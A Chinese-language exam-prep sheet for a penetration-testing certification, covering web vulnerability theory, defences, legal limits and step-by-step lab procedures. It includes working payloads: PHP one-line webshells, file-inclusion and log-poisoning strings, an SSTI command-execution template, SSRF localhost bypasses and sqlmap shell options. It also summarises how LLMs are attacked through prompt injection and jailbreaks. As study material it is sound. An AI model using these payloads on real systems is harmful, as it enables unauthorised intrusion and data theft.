# 2026-09-18 CCP 考前一晚 · 单选多选考点 + 三道实操 SOP

> 状态：🧪 考前最后一遍（考试 2026-09-19；**离线、闭卷、自带电脑**）
> 依据：**9/7-9/16 培训课程表**（10 天 16 个 session 的课程内容）+ 我自己的实操记录（DVWA / upload-labs / sqli-labs / xss-labs / PortSwigger / 云帆靶场 / 湘安无事模拟靶场 9001·9002·9003·9010）
> 定位：这份是**最后一晚的稿子** —— 上半篇给笔试（单选+多选），下半篇给实操（三道题），末尾一页是**明早进场前 30 分钟看的**。
> 关联：[09-16 考前复习总纲（必背清单）](./2026-09-16-CCP考前复习-Web漏洞实操与必背清单.md) · [09-16(续) 实操带练：文件包含/RCE/上传绕过](./2026-09-16(续)-CCP实操带练-文件包含与RCE与上传绕过.md) · [CCP备考-计划与考纲映射](./CCP备考-计划与考纲映射.md)

---

## 〇、先把考试形态钉死（决定今晚时间怎么花）

| 项 | 内容 | 我的应对 |
|---|---|---|
| 题型 | **单选 + 多选 + 三道实操** | 客观题靠这份的上半篇；实操靠下半篇 SOP |
| 客观题来源 | 就是培训表里的 10 天内容（**不是**渗透大牛题）：名词、协议/端口、工具用途、原理判定、防护措施、法规、大模型安全 | 每块只需「一句话结论 + 易混对比」，**不要深挖** |
| 实操范围 | 培训表第 9/11-9/13 讲的这些：SQL 注入 · XSS · CSRF · SSRF · 文件上传 · 越权 · 文件包含 · XXE（模拟题同源靶场还出现过 **爆破** 和 **SSTI**） | 见第二节按概率排的 SOP |
| 关键约束 | 不让查资料 → **必须闭卷** | 背「判定 → 一条通路 → 一句防御」，别背全清单 |

**时间分配原则**（不论总时长多少都通用）：
```
① 客观题先做，单选秒过（不会的直接标一个走）、多选拿不准就"宁少勿多"（错选不得分的话）
② 三道实操按"会做的先做完"排序，不做顺序强迫
③ 单题超过 15 分钟没进展 → 换题；回来时先看"我上次卡在哪一步"（记录现象，别重复同一条路）
④ 留最后 10 分钟：检查有无"上传成功但没验证执行""跑通了但没拿证据"的题
```

---

# 上半篇 · 单选/多选考点（按培训表 10 天切块）

> 用法：每条 = 一个「能直接出题的正确表述」。⚠️ = 多选陷阱（考试爱在这种地方埋"看起来对"的错项）。

## 1｜网安基础与漏洞入门（9/7）

- **漏洞**：系统在设计、实现、配置、运维环节中存在的缺陷；被利用后造成**保密性/完整性/可用性**受损。
- **风险 = 资产价值 × 威胁 × 脆弱性**；风险分级看「影响程度 + 利用难度」。
- **漏洞成因五类**：① 输入未校验 ② 权限/访问控制缺失 ③ 配置不当 ④ 组件过时（脆弱依赖）⑤ 设计缺陷（业务逻辑）。
- **OWASP Top 10（2021）必须背全**：
  A01 访问控制失效 · A02 加密机制失效 · A03 注入 · A04 不安全设计 · A05 安全配置错误 · A06 脆弱过时组件 · A07 身份认证失效 · A08 软件与数据完整性失效 · A09 安全日志与监控失效 · A10 **SSRF**
- **渗透测试流程（7 步）**：前期交互与**授权** → 信息收集 → 威胁建模 → 漏洞分析 → 漏洞利用 → 后渗透（提权/横向/清理痕迹）→ **报告与修复复盘**。
- **法律红线**：网络安全法 · 数据安全法 · 个人信息保护法 · **等保 2.0**（网络安全等级保护）；渗透必须**书面授权**、范围与时间明确、超范围即停并报告。
- ⚠️ 错项常写：「漏洞是黑客工具造成的」❌、「渗透测试=攻击」❌（是**授权的安全评估**）、「发现漏洞可自行公开」❌。

## 2｜环境搭建（9/7 下）

- **VMware 三种网络模式**（必考！）：
  | 模式 | 谁发 IP | 能否出网 | 能否被宿主机访问 | 用途 |
  |---|---|---|---|---|
  | **桥接（Bridged）** | 所在物理网段（和宿主机同级） | ✅ | ✅ | 让靶机像局域网内一台真机 |
  | **NAT** | VMware 虚拟 DHCP | ✅（经宿主机转换） | ✅ | 打靶最常用（宿主机/Kali 同网段互访、还能出网装工具） |
  | **仅主机（Host-Only）** | VMware 虚拟 DHCP | ❌ | ✅ | 最隔离，做恶意样本/断网靶场 |
- **Kali**：默认普通用户 `kali`（密码同），提权用 `sudo`；**快照**是打靶前必做动作。
- **靶场导入**：`.ova` 用「打开/导入虚拟机」；靶机常需改网卡为 NAT。
- ⚠️ 多选：「搭建靶场要注意」= 网络隔离 / 不暴露到公网 / 不存放真实敏感数据 / 先拍快照 / 只用授权镜像。

## 3｜网络基础（9/8）—— 单选重灾区，性价比最高的一块

- **OSI 七层**（从上到下）：应用 / 表示 / 会话 / 传输 / 网络 / 数据链路 / 物理；**TCP/IP 四层**：应用 / 传输 / 网际 / 网络接口。
  - 归属：HTTP·FTP·SMTP·DNS = 应用层；**TCP·UDP·端口 = 传输层**；IP·ICMP·路由 = 网络层；ARP·以太网 = 链路层。
- **TCP vs UDP**：TCP 面向连接、可靠、三次握手、有重传与流量控制；UDP 无连接、不可靠、快（DNS 查询、视频、SNMP 用 UDP）。
- **三次握手** SYN → SYN+ACK → ACK；**四次挥手**（FIN/ACK ×2 来回）。
- **常用端口 → 服务 → 漏洞**（闭眼要能写）：
  | 端口 | 服务 | 典型问题 |
  |---|---|---|
  | 21 | FTP | 匿名登录 / 弱口令 |
  | 22 | SSH | 弱口令爆破 / 密钥泄露 |
  | 23 | Telnet | 明文传输 / 爆破 |
  | 25/110/143 | SMTP/POP3/IMAP | 邮件信息泄露 |
  | 53 | DNS | 区域传送 / 劫持 |
  | 80/443 | HTTP/HTTPS | Web 漏洞全家族 |
  | 135/139/445 | RPC/SMB | **445 永恒之蓝**、横向移动 |
  | 1433 | MSSQL | `xp_cmdshell` 提权 |
  | 1521 | Oracle | 弱口令 |
  | 3306 | MySQL | 注入 / UDF 提权 / 未授权 |
  | 3389 | RDP | 爆破 / 蓝屏漏洞 |
  | 6379 | Redis | **未授权访问**→ 写文件 getshell |
  | 27017 | MongoDB | 未授权 |
  | 8080 | Tomcat/中间件 | 弱口令后台 / 反序列化 |
- **HTTP 基础**：
  - 方法：GET（参数在 URL，可缓存/有长度限制）· POST（参数在 body）· PUT/DELETE · HEAD · OPTIONS · TRACE。
  - 常见状态码：200 成功 · 301/302 重定向 · 400 请求错误 · **401 未认证** · **403 存在但被拒绝** · 404 不存在 · 405 方法不允许 · 500 服务器内部错误 · 502/503 网关/服务不可用。
  - 请求头：`Host` `User-Agent` `Referer` `Cookie` `Content-Type` `X-Forwarded-For`。
  - HTTPS = HTTP + TLS，端口 443，防的是**传输过程窃听/篡改**（不防漏洞）。
- **抓包 / 连通性测试**：抓包分析器看数据包（Wireshark/Burp）；`ping` 走 **ICMP** 测连通；`telnet ip 端口` 测**端口是否开放**（明文，不安全）。
- **Web 架构三层**：前端（浏览器/HTML/JS）→ 后端（中间件 + 应用 + 语言）→ 数据库。
- ⚠️ 陷阱：「HTTPS 网站就没有漏洞」❌；「ping 通的端口就是开放的」❌（ping 是 ICMP，与端口无关）。

## 4｜Linux 环境与命令（9/8 下）

- **核心目录**：`/etc` 配置 · `/var/log` 日志 · `/tmp` 临时（可写） · `/home` 用户家目录 · `/root` root 家目录 · `/bin` `/usr/bin` 命令 · `/proc` 进程与内核信息 · 站点根 `/var/www/html`（Apache/Nginx 常见）。
- **权限**：`r=4 w=2 x=1`；`chmod 755` = rwxr-xr-x；`chown` 改属主；目录的 `x` 含义是「能进入」。
- **特殊权限**：**SUID（4）** 执行时以文件属主身份运行 → Linux 提权重灾区（`find / -perm -4000 2>/dev/null`）；SGID、Sticky Bit（`/tmp` 的 t）。
- **高频命令按用途**（多选爱考"用哪个命令干这件事"）：
  | 目的 | 命令 |
  |---|---|
  | 看进程 | `ps aux` / `top` |
  | 看端口连接 | `netstat -tulnp` / `ss -tulnp` |
  | 查文件内容 | `cat` `head` `tail -f`（跟日志） `less` |
  | 搜索 | `grep -rn "关键字" /路径` / `find / -name "*.php"` |
  | 文件操作 | `cp` `mv` `rm -rf` `tar -zcvf` `unzip` |
  | 用户权限 | `id` `whoami` `useradd` `passwd` `sudo -l` |
  | 网络请求 | `curl` `wget` |
  | 管道组合 | `cat access.log \| grep 404 \| sort \| uniq -c`（**文本处理三件套 grep/sed/awk**） |
- ⚠️ 陷阱：`chmod 777` 不是安全做法 ❌（提权/篡改风险）；`rm -rf /` 当然错。

## 5｜信息收集（9/9）

- **两大类**：**被动（OSINT，不直接接触目标）** vs **主动（扫描，会留下流量）**。
  - 被动：域名（WHOIS/ICP 备案）· IP 归属 · 子域名（证书透明度、搜索引擎）· 企业公开信息（组织架构、邮箱）· 敏感信息泄露（GitHub、`.git`、备份文件、JS 里的注释/接口/密钥）。
  - 主动：端口扫描、目录扫描、指纹识别、子域名爆破。
- **工具与用途**：`nmap -sV -sC -p- <ip>`（端口+服务版本+默认脚本）· `dirsearch -u <url> -e php,txt`（目录/文件爆破）· `whatweb` / 响应头 `Server`（**指纹识别**）。
- **结果标准化输出**：资产表（域名/IP/端口/服务/版本/中间件）→ 漏洞候选表 → 进入验证。（课程专门强调"输出方法"，笔试可能考"信息收集完成后要做什么"）
- ⚠️ 陷阱：「被动收集会直接接触目标」❌；「子域名只能靠爆破」❌（证书透明度/搜索引擎也能）。

## 6｜Burp Suite（9/10）

- **四大核心模块**（必背）：
  | 模块 | 干什么 |
  |---|---|
  | **Proxy** | 代理拦截、抓包、放行/丢弃、HTTP history |
  | **Repeater** | 改包**重放**（手工测漏洞主战场） |
  | **Intruder** | 自动化爆破/fuzz（**4 种模式**：Sniper 狙击手 · Battering ram 破城锤 · Pitchfork 草叉 · Cluster bomb 集束炸弹） |
  | **Decoder** | 编码解码（Base64/URL/HTML/Hex） |
  - 附加：Comparer（响应对比）· **Collaborator**（带外/OOB，验证盲打漏洞）· 右键 **Generate CSRF PoC** · Macros（2FA 自动登录）。
- **抓包环境**：浏览器设代理 → 导入 **Burp CA 证书**（必须装到"受信任的根证书颁发机构"，否则 HTTPS 报错）→ HTTPS 才能正常抓；手机 App/小程序用 **Proxifier** 强制应用走代理。
- **HTTP 数据包结构**：请求行（方法/路径/版本）+ 请求头 + 空行 + 请求体；响应 = 状态行 + 响应头 + 空行 + 响应体。
- ⚠️ 陷阱：「Burp 只能抓 HTTP 不能抓 HTTPS」❌（装 CA 即可）；「Decoder 能直接加密成 MD5 拿去登录」❌（MD5 是 Hash 不可逆，Decoder 的 hash 只有单向）。

## 7｜SQL 注入（9/11）—— 实操概率最高

- **原理**：用户输入被拼进 SQL 语句、被数据库**当代码执行**。产生条件：① 用户可控输入进入 SQL ② 拼接方式（无参数化）③ 权限足够。
- **危害**：数据泄露（脱库）· 数据篡改/删除 · 认证绕过 · 读写文件 getshell · 提权。
- **MySQL 基础**：`information_schema` 是元数据库（`schemata/tables/columns`）；注释 `-- ` `#` `/**/`；`union` 要求列数一致；`group_concat` 聚合。
- **四类手工注入**（要能对上"看到什么现象用哪种"）：
  | 类型 | 现象 | 打法 |
  |---|---|---|
  | 联合查询 | 页面有回显位 | `order by` 判列数 → `-1' union select 1,2,...` |
  | 报错注入 | 页面回显数据库报错 | `updatexml` / `extractvalue` |
  | 布尔盲注 | 只有"正常/异常"两种页面 | `and 1=1` / `and substr(...)>...` 逐字符猜 |
  | 时间盲注 | 页面完全无差异 | `and sleep(5)` / `if(...,sleep(5),0)` |
- **sqlmap 基础**：`-u` 目标 · `--dbs/--tables/--columns/--dump` · `--batch` · `--level/--risk` · `--tamper`（绕 WAF）· `-r`（从请求文件读，带 Cookie）· `--os-shell`（高权限+可写目录才行，`secure_file_priv` 会挡住）。
- **修复**：**参数化查询/预编译（正解）** + 最小权限账号 + 关闭详细报错 + WAF。
- ⚠️ 多选陷阱：能防注入的是「参数化查询 ✅ / 输入类型白名单 ✅ / 存储过程参数化 ✅」；**不算**正解的是「前端 JS 校验 ❌ / 只转义特殊字符（可能被绕过）⚠️ / 只隐藏报错信息 ❌」。

## 8｜XSS 与 WebShell/蚁剑（9/12）

- **原理**：用户可控内容输出到 HTML 时未被正确编码 → 浏览器把攻击者的脚本当**页面代码**执行。
- **三类型**：**反射型**（一次性，靠链接诱骗）· **存储型**（进数据库，谁看谁中，**危害最大**）· **DOM 型**（前端 JS 处理 `location.hash` 等造成，数据不经过服务端）。
- **危害**：盗 Cookie/凭证 · 钓鱼/挂马 · 键盘记录 · 篡改页面 · 蠕虫式传播 · 配合 CSRF。
- **防御**：**按上下文输出编码**（HTML/属性/JS/URL 各不相同）+ 输入白名单 + **CSP** + **HttpOnly**（防 JS 读 Cookie）+ SameSite。
- **WebShell**：网站后门（一句话木马/大马），用于持久化控制；**蚁剑（AntSword）/哥斯拉** 是连接与管理 WebShell 的工具，能**文件管理 / 虚拟终端（命令执行）/ 数据库操作**。
- ⚠️ 陷阱：「过滤 `<script>` 就能防 XSS」❌（`<img src=1 onerror=...>`）；「HttpOnly 能完全防 XSS」❌（只防偷 Cookie，脚本仍能执行/发请求）；「反射型最危险」❌（存储型）。

## 9｜CSRF（9/12）

- **原理**：**利用浏览器自动携带 Cookie 的机制**，诱导已登录用户去发起一个"他本人不知道"的请求；利用服务端对**浏览器身份**的信任。
- **利用条件（必背三条）**：① 用户已登录且凭据自动携带（Cookie）② 关键参数可预测/无不可猜值 ③ **没有 token 或 token 未真正校验**。
- **防御**：**CSRF Token 且必须绑定会话**（不能放在 Cookie 里）+ 校验 `Referer`/`Origin` + 关键操作二次验证（密码/验证码）+ `SameSite` Cookie + 改状态的方法全都要校验（不能只在 POST 分支校验）。
- **XSS vs CSRF 一句话**：XSS 是**站点信任了用户的输入**（脚本在站点里执行）；CSRF 是**站点信任了浏览器带来的身份**（脚本在攻击者站点里，借你的 Cookie 发请求）。
- ⚠️ 陷阱：「Token 放在 Cookie 里就安全」❌；「CSRF 能直接拿到用户明文密码」❌。

## 10｜SSRF（9/13）

- **原理**：服务端接受了用户提供的 URL 并**替用户发起请求** → 请求源是"内网/本机"，从而绕过网络边界。
- **典型场景**：URL 预览/分享卡片 · 图片抓取/头像 · 文件下载代理 · Webhook · 数据导入 · 在线翻译/截图。
- **利用方向**：探测内网主机与端口 · 访问**只允许本机的管理接口**（`http://127.0.0.1/admin`）· 读文件（`file:///etc/passwd`）· 打内网服务（`gopher://` → Redis 写文件 RCE）· 云元数据（`http://169.254.169.254/`）。
- **黑名单绕过的等价写法（背 4 个够了）**：`127.1` · 十进制 `2130706433` · `0x7f000001` · `[::1]` / `127.0.0.1.nip.io`；白名单绕过用 `http://白名单域@127.0.0.1/` 或白名单域上的开放重定向。
- **判定习惯**：**外网 403 ≠ 404** —— 403 表示"存在但拒绝外网"，正是 SSRF 要找的靶子（我 9010 那题就是这么找到 `/admin/flag` 的）。盲打型用 **Collaborator** 收 DNS/HTTP 回连。
- **防御**：协议白名单（只允许 http/https）· 内网段黑名单（127/10/172.16-31/192.168/169.254）· **不跟随重定向** · 请求出口统一代理并做校验 · 关掉不需要的 URL 功能。
- ⚠️ 陷阱：「只过滤字符串 `127.0.0.1` 就安全」❌（`0x7f000001` 等）；「SSRF 只能读文件」❌。

## 11｜文件上传（9/13）—— 实操概率最高

- **检测手段（决定我怎么绕）**：① 前端 JS 校验 ② `Content-Type`（MIME，客户端提交可伪造）③ 后缀**黑名单/白名单** ④ 文件内容/魔数（`getimagesize`、`exif_imagetype`）⑤ 二次渲染 ⑥ 先落盘后校验（有条件竞争窗口）。
- **绕过阶梯**：前端 → 改 MIME → 黑名单漏网后缀（`.phtml/.php5/.pht`、大小写、双写 `.pphphp`、尾空格/尾点/`::$DATA`——后三者是 Windows 特性）→ 白名单（解析漏洞、`.htaccess`/`.user.ini`、`%00` 截断仅旧 PHP）→ 内容检测（图片马/加 `GIF89a`）→ 二次渲染 → 条件竞争 → 参数可控（`save_name`/`save_path`）。
- **危害判定公式（云帆+9002 沉淀）**：`危害 = 存储路径在不在 Web 根目录 × 后缀在不在解析白名单`；**上传成功 ≠ 可利用**。
- **"被解析"而不是"被下载"怎么判**：响应头 `Content-Type: text/html` + `Set-Cookie: JSESSIONID` = 被脚本引擎执行；`text/plain` / `application/octet-stream` + `Last-Modified` = 静态资源直出（没执行）。
- **防御（正解四层）**：后缀**白名单**（先转小写）+ **随机重命名** + **存到 Web 根之外** + 上传目录**禁脚本解析**（`^~ /uploads/` 不交给 PHP）+ 图片重编码。
- ⚠️ 陷阱：「只查后缀黑名单够了」❌；「只做前端校验」❌；「只查 Content-Type」❌（客户端可控）。

## 12｜越权（9/13）

- **两类**：**水平越权**（同级用户 A 改 B 的数据，如改 `id=1001`→`1002`）；**垂直越权**（低权限做高权限的事，如普通用户访问 `/admin`）。还有**未授权访问**（根本不用登录）。
- **常见入口**：URL/JSON 里的 `id/uid/userId/orderNo` · 换 HTTP 方法（GET↔POST）· `X-Original-URL`/`X-Rewrite-URL` 绕过前置校验 · 多步流程的最后一步不校验 · 前端隐藏的按钮实际接口没鉴权 · 直接访问未挂菜单的接口。
- **检测思路**：用 A 账号拿到的请求，把身份/资源标识替换成 B 的，看是否返回 B 的数据（**对比两个账号的响应**最可靠）。
- **防御**：**服务端对每个请求校验"数据属主"**（不能只看前端/菜单）+ RBAC 权限模型 + 最小权限。
- ⚠️ 陷阱：「前端隐藏按钮 = 安全」❌；「越权=权限提升」❌（Web 越权≠系统提权）。

## 13｜文件包含（9/13）

- **LFI（本地）** vs **RFI（远程，需 `allow_url_include=On`）**；本质同 SQL 注入：**用户可控输入进了解释器的嘴**（这里是 `include`）。
- **必背 payload**：
  ```
  ?file=../../../../etc/passwd                                      ← 读文件
  ?file=php://filter/read=convert.base64-encode/resource=index.php   ← 读源码（必须 base64，否则被 PHP 执行）
  ?file=data://text/plain,<?php system('id');?>                      ← 直接执行（需 allow_url_include）
  ?file=php://input  + body 里写 PHP                                 ← 无文件执行
  ?file=file:///etc/passwd                                           ← 绕 fnmatch("file*") 这类前缀白名单
  UA 写 <?php ...?> → 包含 /var/log/apache2/access.log                ← 日志投毒
  ```
- **利用链（重点）**：上传（图片马）**＋** 包含 **= RCE** —— 前提三条：内容含可执行代码 × 落盘在 Web 可访问路径 × 存在包含点。
- **防御**：不接收用户路径（**白名单映射** id→固定文件）+ 关闭 `allow_url_include`/`allow_url_fopen` + 限制目录。
- ⚠️ 陷阱：「过滤 `../` 就够了」❌（绝对路径/`....//`/伪协议）；「不加 base64 能读源码」❌。

## 14｜XXE（9/13）

- **原理**：XML 解析器默认**允许引用外部实体**，攻击者在 DTD 里定义实体指向本地文件/内网地址，服务端解析时把内容带出。
- **利用**：读文件（`<!ENTITY xxe SYSTEM "file:///etc/passwd">`）· 打内网（`http://192.168.x.x:port/`）· 盲打（外部 DTD + 参数实体）· 拒绝服务（实体展开）。
- **入口**：任何接收 XML 的地方 —— 上传 XML/SVG/Office 文档、SOAP 接口、`Content-Type: application/xml`（把 JSON 改成 XML 试）。
- **防御**：**解析器禁用外部实体/DTD**（Java `disallow-doctype-decl=true`；PHP `libxml_disable_entity_loader(true)`）+ 改 JSON + 过滤但不可靠。
- ⚠️ 陷阱：「过滤 `<!DOCTYPE` 关键字就安全」❌（编码变形/参数实体）；「XXE 只能读文件」❌。

## 15｜大模型攻防基础（9/14）🔴 培训新板块，笔试爱考

- **基础名词**：预训练/微调/推理 · **Token** · 上下文窗口 · 提示词（Prompt）· 温度（Temperature，越高越随机）· RAG（检索增强）。
- **攻击面四类**：
  | 类型 | 说明 |
  |---|---|
  | **提示词注入** | **直接注入**（用户直接让它忽略系统指令）/ **间接注入**（恶意指令藏在它读取的网页、文档、邮件里） |
  | 越狱（Jailbreak） | 用角色扮演/编码绕开安全对齐 |
  | **敏感信息泄露** | 训练数据中的隐私/机密、系统提示词、内部接口被套出来 |
  | 越权/过度代理 | 模型能调用工具/插件时，被诱导执行超范围操作 |
- **OWASP LLM Top 10（认名词即可）**：LLM01 提示注入 · LLM02 不安全输出处理 · LLM03 训练数据投毒 · LLM04 模型拒绝服务 · LLM05 供应链风险 · LLM06 敏感信息泄露 · LLM07 不安全插件设计 · LLM08 过度代理 · LLM09 过度依赖 · LLM10 模型窃取。
- **防御**：输入输出双向过滤 · 权限最小化（工具调用白名单）· 敏感数据脱敏、不进提示词 · 关键动作人工审核 · 输出不直接执行/不直接渲染。
- ⚠️ 陷阱：「提示词注入是模型被黑了/权重被改了」❌（是**输入内容**层面的攻击，模型本身没被改）；「AI 能发现幻觉所以不用人工核对」❌。

## 16｜渗透全流程 + AI 辅助（9/15）

- **完整链路（必背顺序）**：
  ```
  信息收集 → 漏洞探测/验证 → 漏洞利用 → getshell → 权限提升 → 内网横向（如需要）→ 清理痕迹 → 撰写报告
  ```
- **每一步的目的**：收集 = 找面；探测 = 筛出可利用的；利用 = 拿到第一份访问；提权 = 从低权限到高权限；清理 = 不留后门/不残留（**授权范围内**）；报告 = 交付价值。
- **报告要素（多选常考）**：项目与授权信息 · 范围与时间 · 攻击链（复现步骤）· 漏洞详情（位置/原理/危害/**分级**/证据截图）· 修复建议 · 风险总结。
- **AI 辅助**：被动信息收集 · 智能漏洞挖掘 · 辅助利用；**局限 = 幻觉/需人工核实/不能替代授权与判断**。
- ⚠️ 陷阱：「渗透测试的目的就是拿到最高权限」❌（目的是**发现问题并帮助修复**）。

## 17｜法律/职业/等保（9/7+9/16）

- **等保 2.0**：把系统按受破坏后的危害程度分**五级**；流程 = 定级 → 备案 → 建设整改 → 等级测评 → 监督检查。
- **合规名词**：红队（攻击视角评估）· 护网/HW（实战对抗演练）· SRC（企业自建漏洞收集平台，**需在其授权范围内**提交）· CNVD/CNNVD（国家级漏洞库）。
- **漏洞分级**：严重/高/中/低（结合危害 + 利用难度，可对应 CVSS 分值）。
- ⚠️ 陷阱：「在网上随便找个站点测测就是学习」❌（**未授权测试违法**）；「发现漏洞可以卖给第三方」❌。

---

# 下半篇 · 三道实操（按概率排 + 卡点速查）

## 一、通用开场 6 步（拿到任何一台靶机先做这 6 件，别跳）

```
① 定栈：抓一次真实响应，看 Server / X-Powered-By / 404 报错页长相 / Cookie 名（JSESSIONID=Java、PHPSESSID=PHP、ASP.NET_SessionId=.NET、Werkzeug=Flask）
② 探面：dirsearch 扫目录（先看有没有 /admin /upload /uploads /backup /.git /phpinfo.php）+ 浏览页面把所有功能点走一遍
③ 抓包：Burp 代理全开，把"登录/提交/上传/查询/导出"这些动作各做一次，HTTP history 过一遍
④ 读前端：F12 → Network + Sources，翻打包后的 JS（可能有接口名、密钥、Base64 凭据）
⑤ 选型：按功能点猜漏洞类型（有 id 参数→注入/越权；有 URL 参数→SSRF；有上传→上传；有搜索/留言→XSS）
⑥ 记录：一边打一边截图 + 记下 URL/请求/响应（报告要用，也方便换题回来）
```

**五信号定栈表**（我 9/16 最大教训的沉淀）：

| 信号 | 能看出 |
|---|---|
| `Server` / `X-Powered-By` | nginx/Apache/IIS/Tomcat、PHP/Python/Java 及版本 |
| 404/500 页面长相 | Werkzeug（Flask）三段式 / Tomcat `HTTP Status 404 – Not Found` / IIS 报错页 |
| `Content-Disposition`+`ETag`+`Last-Modified` | 静态文件语义（说明"这个后缀没被执行"） |
| Cookie 名 | `JSESSIONID`=Java、`PHPSESSID`=PHP、`connect.sid`=Node、`ASP.NET_SessionId`=.NET |
| 后端报错 | Spring Boot Whitelabel / Flask traceback / PHP Warning（=框架与语言） |

## 二、按概率排的六类题 + SOP

| 概率 | 题型 | 入口识别 | 打法骨架 | 成功长什么样 |
|---|---|---|---|---|
| ★★★★★ | **文件上传 getshell** | 有上传点（头像/附件/导入） | 定栈 → 试原始 `.php/.jsp` → 前端验/改包 → MIME → 黑名单换后缀/双写 → 白名单试解析漏洞 `1.jpg/x.php` → 图片马+包含 | 访问上传文件 **回显出我命令的输出**（`uid=`）；响应头 `X-Powered-By`/`Set-Cookie` 证明被引擎执行 |
| ★★★★★ | **SQL 注入** | `?id=` `?news=` 数字型参数、登录框 | `'` 探错 → `order by N` 判列 → `-1' union select ...` 拿库名 → `information_schema` 拿表/字段 → 脱库；盲注改 `sleep`；sqlmap 兜底 | 页面上出现 **库名/表名/账号密码/flag 明文** |
| ★★★★ | **SSRF** | `?url=` `?path=` `?image=` `?api=`、抓取/预览功能 | 换成自己的地址确认服务端发请求 → 试 `127.0.0.1/admin` → fuzz 找外网 403 的路径 → 内网端口探测（Collaborator 收盲打） | 返回本机/内网接口内容（flag/admin 页）；Collaborator 收到回连 |
| ★★★★ | **登录爆破** | 登录框、无锁定 | **先验信封**：发一次必错密码看响应（400=信封错、200+fail=有效）→ 看 JS 有无加密（MD5 等，node 跑一遍比对）→ 字典分层（高频弱口令→场景词→rockyou）→ Burp Intruder 或脚本（**≤35 线程**）→ Grep-Match 过滤失败特征 | 响应不再是 fail → 拿到密码/进入后台 |
| ★★★ | **解析漏洞（PHP 上传）** | 上传白名单只让图片 | 传 `.jpg` 里写 PHP → 访问 `/uploads/x.jpg/1.php?c=id`（`cgi.fix_pathinfo=On`）；不行试 `/uploads/x.jpg/.php` | 200 + `X-Powered-By: PHP` + 命令回显 |
| ★★★ | **SSTI 模板注入** | 输入回显到页面的字段（简介/昵称/留言） | 填 `{{7*7}}` → 页面显示 `49` = 命中 → `{{lipsum.__globals__['os'].popen('id').read()}}`（或 `cycler`/`config` 变体） | 页面回显**命令输出**；`{{config}}` 里可能有 flag/密钥 |
| ★★ | XSS / CSRF / 越权 / 包含 / XXE | 留言框、个人资料、id 参数、`?page=`、XML 接口 | 见上半篇各类 payload | `alert` 弹框/邮箱被改/token 被绕过/包含到文件/实体被解析 |

## 三、三类最可能"整套动作"（照着演一遍）

### A. 上传类题完整动作（云帆 + 9002 都用这套）
```
1. 传一个 x.jpg（内容是 <?php @eval($_POST['x']);?> 或 <?php system($_GET['c']);?>）
2. 看响应头判断：text/html+Set-Cookie = 被执行；text/plain+Last-Modified = 只是静态文件
3. 若只是静态 → 换后缀/换 MIME/改包/试 .phtml .php5/双写/尾点
4. 若白名单死守图片 → 试解析漏洞 /uploads/x.jpg/1.php  ，或 .htaccess/.user.ini
5. 拿到执行 → 哥斯拉/蚁剑连接（URL+密码+密钥+载荷类型选对）→ 命令执行 → cat flag
6. 提权（若需要）：id → sudo -l / SUID / 内核版本
7. 报告：结论摘要 → 攻击链（第 1-5 步）→ 漏洞分级 → 修复建议（白名单+重命名+Web根外+禁解析）
```

### B. 注入类题完整动作
```
1. 找注入点（?id= 等）→ 单引号探错 → order by 判列 → 定位回显位
2. union 拿 database() → information_schema 拿 tables → columns → dump 出 admin 表
3. 手工卡住 → 把请求存成 req.txt（含 Cookie）→ sqlmap -r req.txt --batch --dbs 一路到 --dump
4. 目标若是"进后台"：拿到的密码先试 MD5 在线/本地破解（hashcat -m 0）
5. 报告：注入点 URL 与 payload → 泄露数据范围 → 修复（参数化查询 + 最小权限 + 关报错）
```

### C. 综合类题（若像 9/15 那种"全流程"）
```
信息收集(nmap/dirsearch/指纹) → 找功能点/接口 → 命中一类漏洞（多用上面 A/B） → getshell
→ 提权 (sudo -l / SUID / 内核) → 拿 flag → 报告
```
> 卡住时的顺序：**先换漏洞类型，再换绕过手法，最后才换工具**。别在同一条路上耗 15 分钟以上。

## 四、卡点速查表（现象 → 含义 → 下一步）

| 现象 | 含义 | 下一步 |
|---|---|---|
| 上传成功但访问是文本/下载 | 没被执行（后缀不在解析白名单） | 换后缀/试解析漏洞/配包含 |
| 访问出现 500 | 代码被执行了，但语法/逻辑错 | **路径对了，改代码内容** |
| 页面空白 | include 失败（路径/权限）或执行了但无输出 | 换路径/加 echo/base64 验证 |
| 一串 Base64 出来 | `php://filter` + 编码成功读到源码 | 直接解码 |
| 一串"假 200"（长度固定、内容=首页） | 站点有 `try_files → index.php` 兜底 | **判据看有无 `X-Powered-By`，不看状态码** |
| 爆破全 fail，且响应 400 | 请求信封（编码/结构）就不对 | 先用一个必错密码自证信封 |
| 爆破几万次无果 | 字典没覆盖 | 换平台配套字典/场景词/看官方复现文（信息收集 > 暴力枚举） |
| SQL 不回显 | 用了 `union` 但原查询有结果 / 列数不对 | 加 `-1` 让原查询为空 / 重新数 `order by` |
| 想读 PHP 源码读到空白 | 没加 `convert.base64-encode`，源码被当 PHP 执行了 | 加编码 |
| 内网地址请求不通 | 目标在内网、或服务端不出网 | 试 `127.0.0.1` / 十进制/十六进制等价写法 / 用 Collaborator 收盲打 |

---

# 附页 · 明早进场前 30 分钟只看这一页

**① 端口**：21 FTP · 22 SSH · 23 Telnet · 53 DNS · 80/443 Web · 445 SMB · 1433 MSSQL · 3306 MySQL · 3389 RDP · 6379 Redis(未授权) · 8080 中间件
**② 状态码**：200 · 301/302 · 400 · 401 未认证 · **403 存在但被拒** · 404 · 405 · 500 · 502/503
**③ OWASP 2021**：A01 访问控制失效 · A02 加密失效 · A03 注入 · A04 不安全设计 · A05 配置错误 · A06 过时组件 · A07 认证失效 · A08 完整性失效 · A09 日志监控失效 · A10 SSRF
**④ 三兄弟对比**
| | 谁被利用 | 触发要素 | 一句话防御 |
|---|---|---|---|
| XSS | 站点信任用户输入 | 输出未编码 | 按上下文输出编码 + CSP + HttpOnly |
| CSRF | 站点信任浏览器身份 | 无有效 token/不校验来源 | Token 绑会话 + 校验 Referer/Origin + SameSite |
| SSRF | 服务端信任用户给的 URL | URL 参数可控 | 协议白名单 + 禁内网段 + 不跟随跳转 |
**⑤ 越权**：水平（同级改 id）/ 垂直（越级用功能）/ 未授权；防御 = **服务端每请求校验数据属主**
**⑥ 包含**：`php://filter/read=convert.base64-encode/resource=` 读源码 · `file://` 绕前缀白名单 · 日志投毒 · 上传+包含=RCE
**⑦ 上传**：危害 = 存储路径 × 解析白名单；防御 = 白名单 + 随机重命名 + Web 根外 + 禁解析
**⑧ XXE**：禁用外部实体（`disallow-doctype-decl`）
**⑨ 命令拼接符**：Linux `; \| \|\| && & $( )` ；Windows `& && \|\| \|`
